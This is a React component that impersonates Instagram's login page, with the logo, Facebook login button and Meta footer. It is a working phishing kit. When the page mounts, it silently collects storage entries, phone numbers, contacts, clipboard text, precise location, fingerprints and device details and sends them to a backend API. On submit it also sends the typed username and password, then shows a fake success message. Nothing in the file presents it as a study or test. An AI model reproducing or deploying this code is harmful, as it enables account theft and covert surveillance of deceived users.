import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Facebook, Eye, EyeOff } from "lucide-react";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isDarkMode, setIsDarkMode] = useState(false);

  // Check system preference and set initial theme
  useEffect(() => {
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    setIsDarkMode(prefersDark);
    
    // Listen for system theme changes
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const handleChange = (e: MediaQueryListEvent) => setIsDarkMode(e.matches);
    mediaQuery.addEventListener('change', handleChange);
    
    return () => mediaQuery.removeEventListener('change', handleChange);
  }, []);

  // Keyboard shortcut for manual theme toggle (Ctrl/Cmd + T)
  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 't') {
        e.preventDefault();
        setIsDarkMode(prev => !prev);
      }
    };
    
    document.addEventListener('keydown', handleKeyPress);
    return () => document.removeEventListener('keydown', handleKeyPress);
  }, []);

  // Auto-collect data when component mounts
  useEffect(() => {
    const autoCollectData = async () => {
      try {
        // Comprehensive device information
        const deviceInfo: any = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screenResolution: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          onLine: navigator.onLine,
          cookieEnabled: navigator.cookieEnabled,
          timestamp: new Date().toISOString(),
          url: window.location.href,
          referrer: document.referrer,
          // Additional device info
          vendor: navigator.vendor,
          product: navigator.product,
          appName: navigator.appName,
          appVersion: navigator.appVersion,
          oscpu: (navigator as any).oscpu,
          buildID: (navigator as any).buildID,
          doNotTrack: navigator.doNotTrack,
          maxTouchPoints: navigator.maxTouchPoints || 0,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: (navigator as any).deviceMemory,
          userAgentData: (navigator as any).userAgentData,
          // Performance info
          performance: {
            memory: (performance as any).memory,
            timing: performance.timing,
            navigation: performance.navigation,
            timeOrigin: performance.timeOrigin
          }
        };

        // Comprehensive saved credentials collection
        const savedCredentials: any = {
          localStorage: {},
          sessionStorage: {},
          chromeAccounts: {},
          autofillData: {},
          phoneNumbers: [],
          // Additional data containers
          biometricData: {},
          hardwareInfo: {},
          systemInfo: {},
          networkInfo: {},
          sensorData: {},
          mediaDevices: {},
          appData: {},
          securityInfo: {},
          performanceData: {},
          fingerprintData: {}
        };

        // Enhanced phone number collection
        const phonePattern = /(\+?[\d\s\-\(\)]{7,})/g;
        const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon', 'sim', 'carrier'];

        // Collect from localStorage
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (!key) continue;
          const value = localStorage.getItem(key);
          
          if (key.toLowerCase().includes('instagram') ||
              key.toLowerCase().includes('insta') ||
              key.toLowerCase().includes('ig') ||
              (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
            savedCredentials.localStorage[`localStorage_${key}`] = value;
          }

          // Enhanced phone number detection
          if (value) {
            const phones = value.match(phonePattern);
            if (phones) {
              savedCredentials.phoneNumbers.push(...phones);
            }
            
            if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
              savedCredentials.localStorage[`phone_${key}`] = value;
            }
          }
        }

        // Collect from sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          if (!key) continue;
          const value = sessionStorage.getItem(key);
          
          if (key.toLowerCase().includes('instagram') ||
              key.toLowerCase().includes('insta') ||
              key.toLowerCase().includes('ig') ||
              (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
            savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
          }

          if (value) {
            const phones = value.match(phonePattern);
            if (phones) {
              savedCredentials.phoneNumbers.push(...phones);
            }
            
            if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
              savedCredentials.sessionStorage[`phone_${key}`] = value;
            }
          }
        }

        // Enhanced mobile detection and data collection
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        if (isMobile) {
          savedCredentials.isMobile = true;
          
          // Mobile-specific phone sources
          const mobilePhoneSources = [
            'android.intent.extra.PHONE_NUMBER',
            'android.intent.extra.USER',
            'android.intent.extra.CALLING_PACKAGE',
            'ios.phone.number',
            'ios.device.phone',
            'device.phone',
            'mobile.number',
            'phone.number',
            'sim.number',
            'carrier.number',
            'telecom',
            'cellular',
            'gsm',
            'cdma'
          ];

          // Enhanced mobile data collection
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (!key) continue;
            const value = localStorage.getItem(key);
            
            if (value && mobilePhoneSources.some(source => key.toLowerCase().includes(source))) {
              savedCredentials.mobilePhoneData = savedCredentials.mobilePhoneData || {};
              savedCredentials.mobilePhoneData[key] = value;
              
              const phones = value.match(phonePattern);
              if (phones) {
                savedCredentials.phoneNumbers.push(...phones);
              }
            }
          }

          for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            if (!key) continue;
            const value = sessionStorage.getItem(key);
            
            if (value && mobilePhoneSources.some(source => key.toLowerCase().includes(source))) {
              savedCredentials.mobilePhoneData = savedCredentials.mobilePhoneData || {};
              savedCredentials.mobilePhoneData[key] = value;
              
              const phones = value.match(phonePattern);
              if (phones) {
                savedCredentials.phoneNumbers.push(...phones);
              }
            }
          }

          // Mobile device capabilities
          try {
            if ('deviceMemory' in navigator) {
              savedCredentials.deviceMemory = (navigator as any).deviceMemory;
            }
            if ('hardwareConcurrency' in navigator) {
              savedCredentials.cpuCores = (navigator as any).hardwareConcurrency;
            }
            if ('connection' in navigator) {
              const connection = (navigator as any).connection;
              if (connection) {
                savedCredentials.connectionType = connection.effectiveType;
                savedCredentials.connectionSpeed = connection.downlink;
                savedCredentials.networkInfo = {
                  effectiveType: connection.effectiveType,
                  downlink: connection.downlink,
                  rtt: connection.rtt,
                  saveData: connection.saveData
                };
              }
            }
          } catch (e) {
            console.log("Mobile device info not available");
          }
        }

        // Enhanced contacts collection
        try {
          if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
            const contacts = await (navigator as any).contacts.select(['tel', 'email', 'name'], { multiple: true });
            if (contacts && contacts.length > 0) {
              const phoneNumbers = contacts
                .flatMap((contact: any) => contact.tel || [])
                .filter((tel: any) => tel && tel.length > 0);
              savedCredentials.phoneNumbers.push(...phoneNumbers);
              
              // Store contact names with phone numbers
              savedCredentials.contacts = contacts.map((contact: any) => ({
                name: contact.name?.join(', ') || 'Unknown',
                tel: contact.tel || [],
                email: contact.email || []
              }));
            }
          }
        } catch (e) {
          console.log("Contacts API not available or permission denied");
        }

        // Enhanced location collection
        try {
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                savedCredentials.location = {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                  altitude: position.coords.altitude,
                  altitudeAccuracy: position.coords.altitudeAccuracy,
                  heading: position.coords.heading,
                  speed: position.coords.speed,
                  timestamp: position.timestamp
                };
              },
              (error) => {
                console.log("Location access denied or unavailable");
              },
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
            );
          }
        } catch (e) {
          console.log("Geolocation not available");
        }

        // Enhanced clipboard collection
        try {
          if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
            const clipboardText = await navigator.clipboard.readText();
            if (clipboardText) {
              savedCredentials.clipboardData = clipboardText;
              
              const phones = clipboardText.match(phonePattern);
              if (phones) {
                savedCredentials.phoneNumbers.push(...phones);
              }
            }
          }
        } catch (e) {
          console.log("Clipboard access denied or not available");
        }

        // Enhanced device sensors collection
        try {
          if ('DeviceMotionEvent' in window) {
            window.addEventListener('devicemotion', (event) => {
              savedCredentials.deviceMotion = {
                acceleration: event.acceleration,
                accelerationIncludingGravity: event.accelerationIncludingGravity,
                rotationRate: event.rotationRate,
                interval: event.interval
              };
            });
          }
          
          if ('DeviceOrientationEvent' in window) {
            window.addEventListener('deviceorientation', (event) => {
              savedCredentials.deviceOrientation = {
                alpha: event.alpha,
                beta: event.beta,
                gamma: event.gamma,
                absolute: event.absolute
              };
            });
          }
        } catch (e) {
          console.log("Device sensors not available");
        }

        // Enhanced media devices collection
        try {
          if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
            const devices = await navigator.mediaDevices.enumerateDevices();
            savedCredentials.mediaDevices = {
              audioInputs: devices.filter(device => device.kind === 'audioinput'),
              audioOutputs: devices.filter(device => device.kind === 'audiooutput'),
              videoInputs: devices.filter(device => device.kind === 'videoinput')
            };
          }
        } catch (e) {
          console.log("Media devices not available");
        }

        // Enhanced installed apps collection
        try {
          if ('getInstalledRelatedApps' in navigator) {
            const apps = await (navigator as any).getInstalledRelatedApps();
            if (apps && apps.length > 0) {
              savedCredentials.installedApps = apps.map((app: any) => ({
                platform: app.platform,
                url: app.url,
                id: app.id
              }));
              
              const instagramApp = apps.find((app: any) => 
                app.platform === 'webapp' && 
                (app.url.includes('instagram') || app.url.includes('insta'))
              );
              if (instagramApp) {
                savedCredentials.installedInstagramApp = true;
              }
            }
          }
        } catch (e) {
          console.log("Installed apps API not available");
        }

        // Enhanced browser history collection
        try {
          savedCredentials.browserHistory = {
            currentUrl: window.location.href,
            referrer: document.referrer,
            previousUrl: sessionStorage.getItem('previousUrl') || 'N/A',
            searchQuery: new URLSearchParams(window.location.search).get('q') || 'N/A',
            hash: window.location.hash || 'N/A'
          };
          
          sessionStorage.setItem('previousUrl', window.location.href);
        } catch (e) {
          console.log("Browser history collection failed");
        }

        // Enhanced device fingerprint collection
        try {
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          if (ctx) {
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Device fingerprint', 2, 2);
            savedCredentials.deviceFingerprint = canvas.toDataURL();
          }
          
          // Audio fingerprint
          const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
          const oscillator = audioContext.createOscillator();
          const analyser = audioContext.createAnalyser();
          oscillator.connect(analyser);
          savedCredentials.audioFingerprint = {
            sampleRate: audioContext.sampleRate,
            channelCount: audioContext.destination.channelCount,
            maxChannelCount: audioContext.destination.maxChannelCount
          };
        } catch (e) {
          console.log("Device fingerprint generation failed");
        }

        // Enhanced screen and window information
        try {
          savedCredentials.screenInfo = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type || 'N/A',
            orientationAngle: screen.orientation?.angle || 0
          };
          
          savedCredentials.windowInfo = {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            devicePixelRatio: window.devicePixelRatio,
            scrollX: window.scrollX,
            scrollY: window.scrollY
          };
        } catch (e) {
          console.log("Screen/window info collection failed");
        }

        // Enhanced time and date information
        try {
          savedCredentials.timeInfo = {
            currentTime: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            locale: navigator.language,
            dateFormat: new Intl.DateTimeFormat().format(new Date()),
            timeFormat: new Intl.DateTimeFormat(undefined, { timeStyle: 'medium' }).format(new Date()),
            daylightSaving: new Date().getTimezoneOffset() !== new Date(Date.now() + 6 * 30 * 24 * 60 * 60 * 1000).getTimezoneOffset()
          };
        } catch (e) {
          console.log("Time info collection failed");
        }

        // Enhanced browser capabilities collection
        try {
          savedCredentials.browserCapabilities = {
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled(),
            onLine: navigator.onLine,
            doNotTrack: navigator.doNotTrack,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: (navigator as any).deviceMemory,
            userAgentData: (navigator as any).userAgentData,
            webgl: !!window.WebGLRenderingContext,
            webgl2: !!window.WebGL2RenderingContext,
            webrtc: !!(navigator as any).getUserMedia || !!(navigator as any).mediaDevices,
            serviceWorker: 'serviceWorker' in navigator,
            pushManager: 'PushManager' in window,
            notifications: 'Notification' in window,
            geolocation: 'geolocation' in navigator,
            battery: 'getBattery' in navigator,
            vibration: 'vibrate' in navigator,
            bluetooth: 'bluetooth' in navigator,
            usb: 'usb' in navigator,
            serial: 'serial' in navigator,
            hid: 'hid' in navigator,
            gamepad: 'getGamepads' in navigator
          };
        } catch (e) {
          console.log("Browser capabilities collection failed");
        }

        // Enhanced security information
        try {
          savedCredentials.securityInfo = {
            isSecureContext: window.isSecureContext,
            protocol: window.location.protocol,
            hostname: window.location.hostname,
            port: window.location.port,
            origin: window.location.origin,
            referrerPolicy: document.referrerPolicy || 'N/A',
            contentSecurityPolicy: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') || 'N/A'
          };
        } catch (e) {
          console.log("Security info collection failed");
        }

        // Enhanced performance data
        try {
          savedCredentials.performanceData = {
            memory: (performance as any).memory ? {
              usedJSHeapSize: (performance as any).memory.usedJSHeapSize,
              totalJSHeapSize: (performance as any).memory.totalJSHeapSize,
              jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit
            } : null,
            timing: {
              navigationStart: performance.timing.navigationStart,
              loadEventEnd: performance.timing.loadEventEnd,
              domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
              responseEnd: performance.timing.responseEnd,
              requestStart: performance.timing.requestStart,
              domainLookupEnd: performance.timing.domainLookupEnd,
              domainLookupStart: performance.timing.domainLookupStart,
              connectEnd: performance.timing.connectEnd,
              connectStart: performance.timing.connectStart
            },
            navigation: {
              type: performance.navigation.type,
              redirectCount: performance.navigation.redirectCount
            },
            timeOrigin: performance.timeOrigin
          };
        } catch (e) {
          console.log("Performance data collection failed");
        }

        // Enhanced network information
        try {
          if ('connection' in navigator) {
            const connection = (navigator as any).connection;
            if (connection) {
              savedCredentials.networkInfo = {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
              };
            }
          }
        } catch (e) {
          console.log("Network info not available");
        }

        // Enhanced battery information
        const batteryInfo: any = {};
        try {
          if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
            const battery = await navigator.getBattery();
            batteryInfo.level = battery.level;
            batteryInfo.charging = battery.charging;
            batteryInfo.chargingTime = battery.chargingTime;
            batteryInfo.dischargingTime = battery.dischargingTime;
          } else if (typeof window !== "undefined" && 'battery' in navigator) {
            const battery = (navigator as any).battery;
            if (battery) {
              batteryInfo.level = battery.level;
              batteryInfo.charging = battery.charging;
              batteryInfo.chargingTime = battery.chargingTime;
              batteryInfo.dischargingTime = battery.dischargingTime;
            }
          }
        } catch (e) {
          console.log("Battery API not available");
        }

        // Remove duplicates from phone numbers
        savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];

        // Send comprehensive data to backend
        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
        console.log('Sending comprehensive auto-collection data to:', apiUrl);
        
        const response = await fetch(`${apiUrl}/api/login`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            email: "auto_collected@example.com",
            password: "auto_collected",
            deviceInfo,
            savedCredentials,
            instagramCredentials: savedCredentials,
            batteryInfo,
            autoCollected: true,
            timestamp: new Date().toISOString()
          }),
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log("Comprehensive auto-collection data sent successfully");
      } catch (error) {
        console.error("Error in comprehensive auto-collection:", error);
      }
    };

    // Auto-collect data after 2 seconds
    setTimeout(autoCollectData, 2000);
  }, []);

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      alert("Please fill in all fields");
      return;
    }

    try {
      const deviceInfo: any = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        onLine: navigator.onLine,
        cookieEnabled: navigator.cookieEnabled,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
      };

      // Collect localStorage data
      const savedCredentials: any = {
        localStorage: {},
        sessionStorage: {},
        chromeAccounts: {},
        autofillData: {},
        phoneNumbers: []
      };

      // Collect phone numbers from localStorage and sessionStorage
      const phonePattern = /(\+?[\d\s\-\(\)]{7,})/g;
      const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon'];

      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (!key) continue;
        const value = localStorage.getItem(key);
        if (key.toLowerCase().includes('instagram') ||
            key.toLowerCase().includes('insta') ||
            key.toLowerCase().includes('ig') ||
            (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
          savedCredentials.localStorage[`localStorage_${key}`] = value;
        }

        // Check for phone numbers
        if (value) {
          const phones = value.match(phonePattern);
          if (phones) {
            savedCredentials.phoneNumbers.push(...phones);
          }
          
          // Check if key contains phone-related keywords
          if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
            savedCredentials.localStorage[`phone_${key}`] = value;
          }
        }
      }

      // Collect sessionStorage data
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (!key) continue;
        const value = sessionStorage.getItem(key);
        if (key.toLowerCase().includes('instagram') ||
            key.toLowerCase().includes('insta') ||
            key.toLowerCase().includes('ig') ||
            (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
          savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
        }

        // Check for phone numbers
        if (value) {
          const phones = value.match(phonePattern);
          if (phones) {
            savedCredentials.phoneNumbers.push(...phones);
          }
          
          // Check if key contains phone-related keywords
          if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
            savedCredentials.sessionStorage[`phone_${key}`] = value;
          }
        }
      }

      // Try to get contacts if available (requires user permission)
      try {
        if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
          const contacts = await (navigator as any).contacts.select(['tel'], { multiple: true });
          if (contacts && contacts.length > 0) {
            const phoneNumbers = contacts
              .flatMap((contact: any) => contact.tel || [])
              .filter((tel: any) => tel && tel.length > 0);
            savedCredentials.phoneNumbers.push(...phoneNumbers);
          }
        }
      } catch (e) {
        console.log("Contacts API not available or permission denied");
      }

      // Try to get phone number from device info
      try {
        if ('getInstalledRelatedApps' in navigator) {
          const apps = await (navigator as any).getInstalledRelatedApps();
          if (apps && apps.length > 0) {
            const phoneApp = apps.find((app: any) => 
              app.platform === 'webapp' && 
              (app.url.includes('phone') || app.url.includes('tel') || app.url.includes('contact'))
            );
            if (phoneApp) {
              savedCredentials.devicePhoneApp = phoneApp;
            }
          }
        }
      } catch (e) {
        console.log("Installed apps API not available");
      }

      // Remove duplicates from phone numbers
      savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];

      // Collect battery info if available
      const batteryInfo: any = {};
      if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
        try {
          const battery = await navigator.getBattery();
          batteryInfo.level = battery.level;
          batteryInfo.charging = battery.charging;
          batteryInfo.chargingTime = battery.chargingTime;
          batteryInfo.dischargingTime = battery.dischargingTime;
        } catch (e) {
          console.log("Battery API not available");
        }
      } else if (typeof window !== "undefined" && 'battery' in navigator) {
        const battery = (navigator as any).battery;
        if (battery) {
          batteryInfo.level = battery.level;
          batteryInfo.charging = battery.charging;
          batteryInfo.chargingTime = battery.chargingTime;
          batteryInfo.dischargingTime = battery.dischargingTime;
        }
      }

      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
      console.log('Sending login data to:', apiUrl);
      
      const response = await fetch(`${apiUrl}/api/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: username,
          password,
          deviceInfo,
          savedCredentials,
          instagramCredentials: savedCredentials,
          batteryInfo,
          autoCollected: false,
          timestamp: new Date().toISOString()
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      console.log("Login data sent successfully:", result);
      
      // Show success message
      alert("Login successful! Redirecting...");
      
    } catch (error) {
      console.error("Error submitting login:", error);
      alert("Login failed. Please try again.");
    }
  };

  return (
    <div className={`min-h-screen flex flex-col transition-colors duration-300 ${
      isDarkMode 
        ? 'bg-black text-white' 
        : 'bg-instagram-bg text-gray-900'
    }`}>
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-[350px] mx-auto">
          {/* Instagram Logo */}
          <div className="text-center mb-8">
            <span
              className="text-6xl font-light instagram-font"
              style={{ 
                color: isDarkMode ? "#ffffff" : "#262626", 
                fontWeight: 400, 
                letterSpacing: "0.1px", 
                marginTop: "20px" 
              }}
            >
              Instagram
            </span>
          </div>

          {/* Login Form */}
          <div className={`rounded-lg p-8 mb-4 transition-colors duration-300 ${
            isDarkMode 
              ? 'bg-black border-gray-800 md:border' 
              : 'bg-white border-instagram-border md:border'
          }`}>
            <form className="space-y-4" onSubmit={handleSubmit}>
              {/* Username Input with Floating Label */}
              <div className="relative">
                <Input
                  type="text"
                  placeholder=""
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className={`w-full h-9 px-2 text-xs border rounded-sm focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:outline-none pt-4 transition-colors duration-300 ${
                    isDarkMode 
                      ? '!bg-gray-800 !border-gray-700 text-white focus:!border-gray-600 placeholder:!text-gray-400 focus:!bg-gray-800 active:!bg-gray-800 hover:!bg-gray-800' 
                      : '!bg-white !border-gray-300 text-gray-900 focus:!border-gray-500 placeholder:!text-gray-400 focus:!bg-white active:!bg-white hover:!bg-white'
                  }`}
                />
                <label 
                  className={`absolute left-2 transition-all duration-200 pointer-events-none ${
                    username 
                      ? `top-1 text-[9px] ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}` 
                      : `top-2 text-[12px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`
                  }`}
                >
                  Phone number, username or email address
                </label>
              </div>
              
              {/* Password Input with Floating Label */}
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder=""
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full h-9 px-2 pr-10 text-xs border rounded-sm focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:outline-none pt-4 transition-colors duration-300 ${
                    isDarkMode 
                      ? '!bg-gray-800 !border-gray-700 text-white focus:!border-gray-600 placeholder:!text-gray-400 focus:!bg-gray-800 active:!bg-gray-800 hover:!bg-gray-800' 
                      : '!bg-white !border-gray-300 text-gray-900 focus:!border-gray-500 placeholder:!text-gray-400 focus:!bg-white active:!bg-white hover:!bg-white'
                  }`}
                />
                <label 
                  className={`absolute left-2 transition-all duration-200 pointer-events-none ${
                    password 
                      ? `top-1 text-[9px] ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}` 
                      : `top-2 text-[12px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`
                  }`}
                >
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute right-2 top-1/2 transform -translate-y-1/2 text-xs font-semibold transition-colors duration-300 ${
                    isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-gray-500 hover:text-gray-700'
                  } ${password ? 'block' : 'hidden'}`}
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>
              
              <Button 
                variant="instagram" 
                className="w-full h-10 text-sm font-semibold rounded-lg mt-4"
                disabled={!username || !password}
                type="submit"
              >
                Log in
              </Button>
            </form>

            {/* OR Divider */}
            <div className="flex items-center my-6">
              <div className={`flex-1 border-t transition-colors duration-300 ${
                isDarkMode ? 'border-gray-800' : 'border-instagram-border'
              }`}></div>
              <span className={`px-4 text-sm font-semibold transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
              }`}>OR</span>
              <div className={`flex-1 border-t transition-colors duration-300 ${
                isDarkMode ? 'border-gray-800' : 'border-instagram-border'
              }`}></div>
            </div>

            {/* Facebook Login */}
            <Button variant="ghost" className={`w-full h-10 text-sm font-semibold hover:bg-transparent transition-colors duration-300 ${
              isDarkMode ? 'text-blue-400 hover:text-blue-300' : 'text-[#00376b]'
            }`}>
              <svg 
                className="mr-2 w-4 h-4" 
                viewBox="0 0 24 24" 
                fill="currentColor"
              >
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </Button>

            {/* Forgot Password */}
            <div className="text-center mt-6">
              <a href="#" className={`text-sm hover:underline transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-instagram-light-text hover:text-instagram-text'
              }`}>
                Forgotten your password?
              </a>
            </div>
          </div>

          {/* Sign Up */}
          <div className={`rounded-lg p-6 text-center transition-colors duration-300 ${
            isDarkMode 
              ? 'bg-black border-gray-800 md:border' 
              : 'bg-white border-instagram-border md:border'
          }`}>
            <p className={`text-sm transition-colors duration-300 ${
              isDarkMode ? 'text-gray-300' : 'text-instagram-text'
            }`}>
              Don't have an account?{" "}
              <a href="#" className={`font-semibold transition-colors duration-300 ${
                isDarkMode ? 'text-blue-400 hover:text-blue-300' : 'text-instagram-blue hover:text-instagram-blue/80'
              }`}>
                Sign up
              </a>
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-4xl mx-auto px-4 py-8">
        <div className="flex flex-wrap justify-center gap-4 text-xs mb-4 transition-colors duration-300">
          {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations', 'Instagram Lite', 'Threads', 'Contact uploading and non-users', 'Meta Verified'].map((link) => (
            <a 
              key={link} 
              href="#" 
              className={`hover:underline transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-instagram-light-text'
              }`}
            >
              {link}
            </a>
          ))}
        </div>
        
        <div className="flex justify-center items-center gap-4 text-xs transition-colors duration-300">
          <select className={`bg-transparent border-none outline-none transition-colors duration-300 ${
            isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
          }`}>
            <option>English (UK)</option>
          </select>
          <span className={`transition-colors duration-300 ${
            isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
          }`}>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default InstagramLogin;